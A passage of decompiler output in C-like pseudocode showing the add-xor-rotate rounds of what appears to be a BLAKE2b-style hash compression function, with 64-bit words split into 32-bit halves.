    HIDWORD(v249) = v252;
    v253 = HIBYTE(v252) | v1160;
    v590 += __PAIR64__(v253, v249 >> 24) + v618;
    v888 = v602 ^ v590;
    v1044 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v254 = (v602 ^ v590) >> 16;
    LODWORD(v602) = v254;
    v256 = __PAIR64__(((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | (v888 << 16), v254)
         + __PAIR64__(v250, v251);
    v255 = (__PAIR64__(((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | (v888 << 16), v254)
          + __PAIR64__(v250, v251)) >> 32;
    HIDWORD(v602) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | (v888 << 16);
    v257 = v256 ^ (v249 >> 24);
    HIDWORD(v249) = v255 ^ v253;
    LODWORD(v249) = v257;
    LODWORD(v594) = (2 * v257) | ((v255 ^ v253) >> 31);
    v890 = 0;
    HIDWORD(v594) = v249 >> 31;
    v591 += v595 + v612;
    v1122 = v603 ^ v591;
    v258 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
         + __PAIR64__(HIDWORD(v599), v248);
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591));
    v1046 = ((unsigned int)v258 ^ (unsigned int)v595) << 8;
    v892 = v258 ^ v595;
    LODWORD(v21) = (v258 ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((unsigned int)(HIDWORD(v258) ^ HIDWORD(v595)) >> 24) | v1046;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v616;
    v894 = v603 ^ v591;
    v1180 = ((unsigned int)v603 ^ (unsigned int)v591) << 16;
    v259 = (v603 ^ v591) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | v1180;
    HIDWORD(v18) = v259 + v258;
    v603 = __PAIR64__(v21, v259);
    HIDWORD(v599) = (__PAIR64__(v21, v259) + v258) >> 32;
    v260 = (__PAIR64__(v21, v259) + v258) ^ v595;
    LODWORD(v595) = (2 * ((v259 + v258) ^ v595)) | ((unsigned int)(HIDWORD(v599) ^ HIDWORD(v595)) >> 31);
    v896 = 0;
    HIDWORD(v595) = v260 >> 31;
    v592 += v596 + v606;
    v1048 = v604 ^ v592;
    v261 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), v234)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v234;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    v898 = HIDWORD(v21) ^ v596;
    v1124 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(v261, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v261 ^ HIDWORD(v596)) >> 24) | v1124;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v617;
    v1050 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    v900 = v604 ^ v592;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v1050;
    v263 = ((v604 ^ v592) >> 16) + HIDWORD(v21);
    v262 = (__PAIR64__(v21, (v604 ^ v592) >> 16) + __PAIR64__(v261, HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, (v604 ^ v592) >> 16);
    HIDWORD(v600) = v262;
    v264 = __PAIR64__(v262, v263) ^ v596;
    LODWORD(v596) = (2 * (v263 ^ v596)) | ((v262 ^ HIDWORD(v596)) >> 31);
    v902 = 0;
    HIDWORD(v596) = v264 >> 31;
    v593 += v597 + v614;
    v1162 = v605 ^ v593;
    v265 = HIDWORD(v605) ^ HIDWORD(v593);
    v266 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v265 + v601) ^ v597;
    v1052 = (_DWORD)v21 << 8;
    v904 = v21;
    LODWORD(v597) = __PAIR64__(HIDWORD(v266) ^ HIDWORD(v597), v21) >> 24;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v266) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v597 + v609;
    v267 = v265 ^ v593;
    v1126 = v267 << 16;
    v906 = v267;
    v268 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v267) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v267 << 16);
    v605 = __PAIR64__(v21, v268);
    v601 = __PAIR64__(v21, v268) + v266;
    v269 = (__PAIR64__(v21, v268) + v266) ^ v597;
    LODWORD(v597) = (2 * ((v268 + v266) ^ v597)) | ((((__PAIR64__(v21, v268) + v266) >> 32) ^ HIDWORD(v597)) >> 31);
    v908 = 0;
    HIDWORD(v597) = v269 >> 31;
    v590 += v595 + v610;
    v1054 = v268 ^ v590;
    v270 = (__PAIR64__(v268 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590)) + __PAIR64__(HIDWORD(v600), v263)) >> 32;
    HIDWORD(v21) = (HIDWORD(v605) ^ HIDWORD(v590)) + v263;
    v605 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590));
    v910 = HIDWORD(v21) ^ v595;
    v1190 = (HIDWORD(v21) ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (__PAIR64__(v270, HIDWORD(v21)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v270 ^ HIDWORD(v595)) >> 24) | v1190;
    v590 += __PAIR64__(HIDWORD(v595), v21) + v619;
    v912 = v605 ^ v590;
    v1056 = ((unsigned int)v605 ^ (unsigned int)v590) << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v590)) >> 16) | v1056;
    v272 = ((v605 ^ v590) >> 16) + HIDWORD(v21);
    v271 = (__PAIR64__(v21, (v605 ^ v590) >> 16) + __PAIR64__(v270, HIDWORD(v21))) >> 32;
    v605 = __PAIR64__(v21, (v605 ^ v590) >> 16);
    HIDWORD(v600) = v271;
    v273 = __PAIR64__(v271, v272) ^ v595;
    LODWORD(v595) = (2 * (v272 ^ v595)) | ((v271 ^ HIDWORD(v595)) >> 31);
    v914 = 0;
    HIDWORD(v595) = v273 >> 31;
    v591 += v596 + v613;
    v274 = HIDWORD(v602) ^ HIDWORD(v591);
    v653 = v602 ^ v591;
    v275 = (HIDWORD(v602) ^ HIDWORD(v591)) + v601;
    HIDWORD(v601) = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v601) >> 32;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v601) = v275;
    v916 = v275 ^ v596;
    v1058 = (v275 ^ (unsigned int)v596) << 8;
    LODWORD(v21) = (__PAIR64__(HIDWORD(v601), v275) ^ v596) >> 24;
    LODWORD(v596) = v21;
    v276 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | v1058, v21) + v611;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 24) | v1058;
    v591 += v276;
    v277 = v274 ^ v591;
    v918 = v277;
    v1164 = v277 << 16;
    v278 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v277) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v277 << 16);
    v602 = __PAIR64__(v21, v278);
    v601 += __PAIR64__(v21, v278);
    v279 = v601 ^ v596;
    LODWORD(v596) = (2 * (v601 ^ v596)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v596)) >> 31);
    v920 = 0;
    HIDWORD(v596) = v279 >> 31;
    v592 += v597 + v621;
    v280 = HIDWORD(v603) ^ HIDWORD(v592);
    v1060 = v603 ^ v592;
    HIDWORD(v603) = v603 ^ v592;
    v282 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, v280) + __PAIR64__(v255, v256);
    v281 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, v280) + __PAIR64__(v255, v256)) >> 32;
    v922 = v282 ^ v597;
    v1130 = ((unsigned int)v282 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v281, v282) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v281 ^ HIDWORD(v597)) >> 24) | v1130;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v620;
    v283 = v280 ^ v592;
    v924 = v283;
    v1062 = v283 << 16;
    v284 = __PAIR64__(HIDWORD(v603) ^ HIDWORD(v592), v283) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | (v283 << 16);
    v286 = __PAIR64__(v21, v284) + __PAIR64__(v281, v282);
    v285 = (__PAIR64__(v21, v284) + __PAIR64__(v281, v282)) >> 32;
    v603 = __PAIR64__(v21, v284);
    v597 = (2 * (__PAIR64__(v285, v286) ^ v597)) | ((v285 ^ HIDWORD(v597)) >> 31);
    v926 = 0;
    v593 += v594 + v607;
    v287 = HIDWORD(v604) ^ HIDWORD(v593);
    v654 = v604 ^ v593;
    v288 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    HIDWORD(v18) += HIDWORD(v604) ^ HIDWORD(v593);
    HIDWORD(v604) = v604 ^ v593;
    HIDWORD(v599) = v288;
    v657 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    v655 = HIDWORD(v18) ^ v594;
    LODWORD(v21) = (__PAIR64__(v288, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v288 ^ HIDWORD(v594)) >> 24) | v657;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v615;
    v289 = v287 ^ v593;
    v661 = v289 << 16;
    v659 = v289;
    v290 = __PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v289) >> 16;
    v291 = v290;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | v661;
    v293 = v290 + HIDWORD(v18);
    v292 = (__PAIR64__(v21, v290) + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, v291);
    HIDWORD(v599) = v292;
    v294 = __PAIR64__(v292, v293) ^ v594;
    v663 = 0;
    LODWORD(v594) = (2 * (v293 ^ v594)) | ((v292 ^ HIDWORD(v594)) >> 31);
    HIDWORD(v594) = v294 >> 31;
    v590 += v594 + v618;
    v295 = HIDWORD(v602) ^ HIDWORD(v590);
    v665 = v602 ^ v590;
    v297 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v285, v286);
    v296 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v285, v286)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    v667 = v297 ^ v594;
    v669 = ((unsigned int)v297 ^ (unsigned int)v594) << 8;
    v298 = __PAIR64__(v296, v297) ^ v594;
    HIDWORD(v594) = ((v296 ^ HIDWORD(v594)) >> 24) | v669;
    v590 += __PAIR64__(HIDWORD(v594), v298 >> 24) + v611;
    v299 = v295 ^ v590;
    v671 = v299;
    v673 = v299 << 16;
    v300 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v590), v299) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | (v299 << 16);
    v302 = __PAIR64__(v21, v300) + __PAIR64__(v296, v297);
    v301 = (__PAIR64__(v21, v300) + __PAIR64__(v296, v297)) >> 32;
    v602 = __PAIR64__(v21, v300);
    v303 = v302 ^ (v298 >> 24);
    HIDWORD(v298) = v301 ^ HIDWORD(v594);
    LODWORD(v298) = v303;
    v675 = 0;
    LODWORD(v594) = (2 * v303) | ((v301 ^ HIDWORD(v594)) >> 31);
    HIDWORD(v594) = v298 >> 31;
    v591 += v595 + v607;
    v677 = v603 ^ v591;
    v304 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591))
          + __PAIR64__(HIDWORD(v599), v293)) >> 32;
    HIDWORD(v18) = (HIDWORD(v603) ^ HIDWORD(v591)) + v293;
    HIDWORD(v599) = v304;
    v603 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v591, HIDWORD(v603) ^ HIDWORD(v591));
    v681 = (HIDWORD(v18) ^ (unsigned int)v595) << 8;
    v679 = HIDWORD(v18) ^ v595;
    LODWORD(v21) = (__PAIR64__(v304, HIDWORD(v18)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v304 ^ HIDWORD(v595)) >> 24) | v681;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v621;
    v685 = ((unsigned int)v603 ^ (unsigned int)v591) << 16;
    v683 = v603 ^ v591;
    v305 = (v603 ^ v591) >> 16;
    v306 = v305;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | v685;
    v308 = v305 + HIDWORD(v18);
    v307 = (__PAIR64__(v21, v305) + __PAIR64__(HIDWORD(v599), HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, v306);
    HIDWORD(v599) = v307;
    v309 = __PAIR64__(v307, v308) ^ v595;
    LODWORD(v595) = (2 * (v308 ^ v595)) | ((v307 ^ HIDWORD(v595)) >> 31);
    v687 = 0;
    HIDWORD(v595) = v309 >> 31;
    v592 += v596 + v620;
    v689 = v604 ^ v592;
    v310 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), v272)) >> 32;
    HIDWORD(v21) = (HIDWORD(v604) ^ HIDWORD(v592)) + v272;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    HIDWORD(v600) = v310;
    v693 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    v691 = HIDWORD(v21) ^ v596;
    LODWORD(v21) = (__PAIR64__(v310, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v310 ^ HIDWORD(v596)) >> 24) | v693;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v619;
    v695 = v604 ^ v592;
    v697 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    v311 = (v604 ^ v592) >> 16;
    LODWORD(v604) = v311;
    v313 = v311 + HIDWORD(v21);
    v312 = (__PAIR64__(((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | (v695 << 16), v311)
          + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    HIDWORD(v604) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | (v695 << 16);
    v314 = __PAIR64__(v312, v313) ^ v596;
    LODWORD(v596) = (2 * (v313 ^ v21)) | ((v312 ^ HIDWORD(v596)) >> 31);
    v699 = 0;
    HIDWORD(v596) = v314 >> 31;
    v593 += v597 + v610;
    v315 = HIDWORD(v605) ^ HIDWORD(v593);
    v701 = v605 ^ v593;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v315 + v601) ^ v597;
    v601 += __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, v315);
    LODWORD(v605) = v315;
    v703 = v21;
    v705 = (_DWORD)v21 << 8;
    LODWORD(v314) = v21;
    HIDWORD(v314) = HIDWORD(v601) ^ HIDWORD(v597);
    LODWORD(v597) = v314 >> 24;
    v316 = __PAIR64__(((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8), v597) + v616;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v316;
    v707 = v315 ^ v593;
    v709 = (v315 ^ (unsigned int)v593) << 16;
    HIDWORD(v314) = HIDWORD(v605) ^ HIDWORD(v593);
    v317 = (v605 ^ v593) >> 16;
    HIDWORD(v605) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | v709;
    v601 += __PAIR64__(HIWORD(HIDWORD(v314)) | v709, v317);
    v318 = v601 ^ v597;
    LODWORD(v597) = (2 * (v601 ^ v597)) | ((unsigned int)(HIDWORD(v601) ^ HIDWORD(v597)) >> 31);
    v711 = 0;
    HIDWORD(v597) = v318 >> 31;
    v590 += v595 + v606;
    v713 = v317 ^ v590;
    v319 = __PAIR64__(v317 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590)) + __PAIR64__(v312, v313);
    v605 = __PAIR64__(v317 ^ (unsigned int)v590, HIDWORD(v605) ^ HIDWORD(v590));
    v715 = v319 ^ v595;
    v717 = ((unsigned int)v319 ^ (unsigned int)v595) << 8;
    LODWORD(v21) = (v319 ^ v595) >> 24;
    v320 = ((unsigned int)(HIDWORD(v319) ^ HIDWORD(v595)) >> 24) | v717;
    LODWORD(v595) = v21;
    v321 = v21 + v613 + v590;
    LODWORD(v21) = (__PAIR64__(v320, v21) + v613 + v590) >> 32;
    v590 = __PAIR64__(v21, v321);
    v721 = ((unsigned int)v605 ^ v321) << 16;
    v719 = v605 ^ v321;
    v322 = v605 ^ __PAIR64__(v21, v321);
    LODWORD(v21) = ((unsigned int)((v605 ^ __PAIR64__(v21, v321)) >> 32) >> 16) | v721;
    HIDWORD(v21) = (v322 >> 16) + v319;
    HIDWORD(v605) = v21;
    LODWORD(v605) = v322 >> 16;
    HIDWORD(v600) = (__PAIR64__(v21, v605) + v319) >> 32;
    HIDWORD(v322) = HIDWORD(v600) ^ v320;
    LODWORD(v322) = HIDWORD(v21) ^ v595;
    LODWORD(v595) = (2 * (HIDWORD(v21) ^ v595)) | ((HIDWORD(v600) ^ v320) >> 31);
    v723 = 0;
    HIDWORD(v595) = v322 >> 31;
    v591 += v596 + v612;
    v725 = v602 ^ v591;
    v323 = HIDWORD(v602) ^ HIDWORD(v591);
    v324 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v591, HIDWORD(v602) ^ HIDWORD(v591)) + v601;
    HIDWORD(v602) = v602 ^ v591;
    LODWORD(v21) = (v323 + v601) ^ v596;
    v727 = v21;
    v729 = (_DWORD)v21 << 8;
    LODWORD(v596) = __PAIR64__(HIDWORD(v324) ^ HIDWORD(v596), v21) >> 24;
    HIDWORD(v596) = ((unsigned int)(HIDWORD(v324) ^ HIDWORD(v596)) >> 24) | ((_DWORD)v21 << 8);
    v591 += v596 + v609;
    v325 = v323 ^ v591;
    v731 = v325;
    v733 = v325 << 16;
    v326 = __PAIR64__(HIDWORD(v602) ^ HIDWORD(v591), v325) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v591)) >> 16) | (v325 << 16);
    v602 = __PAIR64__(v21, v326);
    v601 = __PAIR64__(v21, v326) + v324;
    v327 = (__PAIR64__(v21, v326) + v324) ^ v596;
    LODWORD(v596) = (2 * ((v326 + v324) ^ v596)) | ((((__PAIR64__(v21, v326) + v324) >> 32) ^ HIDWORD(v596)) >> 31);
    v735 = 0;
    HIDWORD(v596) = v327 >> 31;
    v592 += v597 + v615;
    v328 = HIDWORD(v603) ^ HIDWORD(v592);
    v737 = v603 ^ v592;
    v330 = __PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v301, v302);
    v329 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v592, HIDWORD(v603) ^ HIDWORD(v592)) + __PAIR64__(v301, v302)) >> 32;
    HIDWORD(v603) = v603 ^ v592;
    v739 = v330 ^ v597;
    v741 = ((unsigned int)v330 ^ (unsigned int)v597) << 8;
    LODWORD(v21) = (__PAIR64__(v329, v330) ^ v597) >> 24;
    LODWORD(v597) = v21;
    HIDWORD(v597) = ((v329 ^ HIDWORD(v597)) >> 24) | v741;
    v592 += __PAIR64__(HIDWORD(v597), v21) + v608;
    v331 = v328 ^ v592;
    v743 = v331;
    v745 = v331 << 16;
    v332 = __PAIR64__(HIDWORD(v603) ^ HIDWORD(v592), v331) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v592)) >> 16) | (v331 << 16);
    v334 = __PAIR64__(v21, v332) + __PAIR64__(v329, v330);
    v333 = (__PAIR64__(v21, v332) + __PAIR64__(v329, v330)) >> 32;
    v603 = __PAIR64__(v21, v332);
    v597 = (2 * (__PAIR64__(v333, v334) ^ v597)) | ((v333 ^ HIDWORD(v597)) >> 31);
    v747 = 0;
    v593 += v594 + v614;
    v335 = HIDWORD(v604) ^ HIDWORD(v593);
    v749 = v604 ^ v593;
    v336 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v593, HIDWORD(v604) ^ HIDWORD(v593))
          + __PAIR64__(HIDWORD(v599), v308)) >> 32;
    HIDWORD(v18) = (HIDWORD(v604) ^ HIDWORD(v593)) + v308;
    HIDWORD(v604) = v604 ^ v593;
    v751 = HIDWORD(v18) ^ v594;
    v753 = (HIDWORD(v18) ^ (unsigned int)v594) << 8;
    LODWORD(v21) = (__PAIR64__(v336, HIDWORD(v18)) ^ v594) >> 24;
    LODWORD(v594) = v21;
    HIDWORD(v594) = ((v336 ^ HIDWORD(v594)) >> 24) | v753;
    v593 += __PAIR64__(HIDWORD(v594), v21) + v617;
    v337 = v335 ^ v593;
    v755 = v337;
    v757 = v337 << 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v593)) >> 16) | (v337 << 16);
    v339 = (__PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v337) >> 16) + HIDWORD(v18);
    v338 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v337) >> 16) + __PAIR64__(v336, HIDWORD(v18))) >> 32;
    v604 = __PAIR64__(v21, __PAIR64__(HIDWORD(v604) ^ HIDWORD(v593), v337) >> 16);
    HIDWORD(v599) = v338;
    v340 = __PAIR64__(v338, v339) ^ v594;
    v759 = 0;
    LODWORD(v594) = (2 * (v339 ^ v594)) | ((v338 ^ HIDWORD(v594)) >> 31);
    v590 += __PAIR64__(v340 >> 31, v594) + v619;
    v341 = HIDWORD(v602) ^ HIDWORD(v590);
    v761 = v602 ^ v590;
    v343 = __PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v333, v334);
    v342 = (__PAIR64__((unsigned int)v602 ^ (unsigned int)v590, HIDWORD(v602) ^ HIDWORD(v590)) + __PAIR64__(v333, v334)) >> 32;
    HIDWORD(v602) = v602 ^ v590;
    v763 = v343 ^ v594;
    LODWORD(v602) = v341;
    v344 = v342 ^ (v340 >> 31);
    v765 = ((unsigned int)v343 ^ (unsigned int)v594) << 8;
    LODWORD(v340) = v343 ^ v594;
    HIDWORD(v340) = v344;
    v345 = HIBYTE(v344) | v765;
    v590 += __PAIR64__(v345, v340 >> 24) + v617;
    v767 = v602 ^ v590;
    v769 = ((unsigned int)v602 ^ (unsigned int)v590) << 16;
    v346 = (v602 ^ v590) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v602) ^ HIDWORD(v590)) >> 16) | v769;
    v348 = __PAIR64__(v21, v346) + __PAIR64__(v342, v343);
    v347 = (__PAIR64__(v21, v346) + __PAIR64__(v342, v343)) >> 32;
    v602 = __PAIR64__(v21, v346);
    v349 = v348 ^ (v340 >> 24);
    HIDWORD(v340) = v347 ^ v345;
    LODWORD(v340) = v349;
    LODWORD(v594) = (2 * v349) | ((v347 ^ v345) >> 31);
    v771 = 0;
    HIDWORD(v594) = v340 >> 31;
    v350 = (v595 + v613 + v591) >> 32;
    LODWORD(v591) = v595 + v613 + v591;
    v773 = v603 ^ v591;
    HIDWORD(v591) = v350;
    v351 = HIDWORD(v603) ^ v350;
    HIDWORD(v603) = v603 ^ v591;
    v352 = (__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, v351) + __PAIR64__(HIDWORD(v599), v339)) >> 32;
    HIDWORD(v18) = v351 + v339;
    v775 = (v351 + v339) ^ v595;
    v777 = v775 << 8;
    LODWORD(v21) = ((__PAIR64__((unsigned int)v603 ^ (unsigned int)v591, v351) + __PAIR64__(HIDWORD(v599), v339)) ^ v595) >> 24;
    LODWORD(v595) = v21;
    HIDWORD(v595) = ((v352 ^ HIDWORD(v595)) >> 24) | v777;
    v591 += __PAIR64__(HIDWORD(v595), v21) + v620;
    v353 = v351 ^ v591;
    v781 = v353 << 16;
    v779 = v353;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v603) ^ HIDWORD(v591)) >> 16) | (v353 << 16);
    v355 = (__PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v353) >> 16) + HIDWORD(v18);
    v354 = (__PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v353) >> 16) + __PAIR64__(v352, HIDWORD(v18))) >> 32;
    v603 = __PAIR64__(v21, __PAIR64__(HIDWORD(v603) ^ HIDWORD(v591), v353) >> 16);
    HIDWORD(v599) = v354;
    v356 = __PAIR64__(v354, v355) ^ v595;
    v783 = 0;
    LODWORD(v595) = (2 * (v355 ^ v595)) | ((v354 ^ HIDWORD(v595)) >> 31);
    HIDWORD(v595) = v356 >> 31;
    v592 += v596 + v618;
    v785 = v604 ^ v592;
    v357 = (__PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592))
          + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    HIDWORD(v21) += HIDWORD(v604) ^ HIDWORD(v592);
    HIDWORD(v600) = v357;
    v604 = __PAIR64__((unsigned int)v604 ^ (unsigned int)v592, HIDWORD(v604) ^ HIDWORD(v592));
    v789 = (HIDWORD(v21) ^ (unsigned int)v596) << 8;
    v787 = HIDWORD(v21) ^ v596;
    LODWORD(v21) = (__PAIR64__(v357, HIDWORD(v21)) ^ v596) >> 24;
    LODWORD(v596) = v21;
    HIDWORD(v596) = ((v357 ^ HIDWORD(v596)) >> 24) | v789;
    v592 += __PAIR64__(HIDWORD(v596), v21) + v607;
    v793 = ((unsigned int)v604 ^ (unsigned int)v592) << 16;
    v791 = v604 ^ v592;
    v358 = (v604 ^ v592) >> 16;
    v359 = v358;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v604) ^ HIDWORD(v592)) >> 16) | v793;
    v361 = v358 + HIDWORD(v21);
    v360 = (__PAIR64__(v21, v358) + __PAIR64__(HIDWORD(v600), HIDWORD(v21))) >> 32;
    v604 = __PAIR64__(v21, v359);
    HIDWORD(v600) = v360;
    v362 = __PAIR64__(v360, v361) ^ v596;
    LODWORD(v596) = (2 * (v361 ^ v596)) | ((v360 ^ HIDWORD(v596)) >> 31);
    v795 = 0;
    HIDWORD(v596) = v362 >> 31;
    v593 += v597 + v609;
    v797 = v605 ^ v593;
    v363 = HIDWORD(v605) ^ HIDWORD(v593);
    v364 = __PAIR64__((unsigned int)v605 ^ (unsigned int)v593, HIDWORD(v605) ^ HIDWORD(v593)) + v601;
    HIDWORD(v605) = v605 ^ v593;
    LODWORD(v21) = (v363 + v601) ^ v597;
    v799 = v21;
    v801 = (_DWORD)v21 << 8;
    LODWORD(v362) = v21;
    HIDWORD(v362) = HIDWORD(v364) ^ HIDWORD(v597);
    LODWORD(v597) = v362 >> 24;
    v365 = __PAIR64__(((unsigned int)(HIDWORD(v364) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8), v597) + v615;
    HIDWORD(v597) = ((unsigned int)(HIDWORD(v364) ^ HIDWORD(v597)) >> 24) | ((_DWORD)v21 << 8);
    v593 += v365;
    v366 = v363 ^ v593;
    v803 = v366;
    v805 = v366 << 16;
    v367 = __PAIR64__(HIDWORD(v605) ^ HIDWORD(v593), v366) >> 16;
    LODWORD(v21) = ((unsigned int)(HIDWORD(v605) ^ HIDWORD(v593)) >> 16) | (v366 << 16);
    v601 = __PAIR64__(v21, v367) + v364;
    v368 = (__PAIR64__(v21, v367) + v364) ^ v597;
    LODWORD(v597) = (2 * ((v367 + v364) ^ v597)) | ((((__PAIR64__(v21, v367) + v364) >> 32) ^ HIDWORD(v597)) >> 31);
    v807 = 0;
    HIDWORD(v597) = v368 >> 31;
    v590 += v595 + v611;
    v809 = v367 ^ v590;
    v369 = __PAIR64__(v367 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590)) + __PAIR64__(HIDWORD(v600), v361);
    v605 = __PAIR64__(v367 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590));
    v813 = ((((unsigned int)v21 ^ HIDWORD(v590)) + v361) ^ (unsigned int)v595) << 8;
    v811 = ((v21 ^ HIDWORD(v590)) + v361) ^ v595;
    LODWORD(v21) = ((__PAIR64__(v367 ^ (unsigned int)v590, (unsigned int)v21 ^ HIDWORD(v590))
                   + __PAIR64__(HIDWORD(v600), v361)) ^ v595) >> 24;
    LODWORD(v595) = v21;
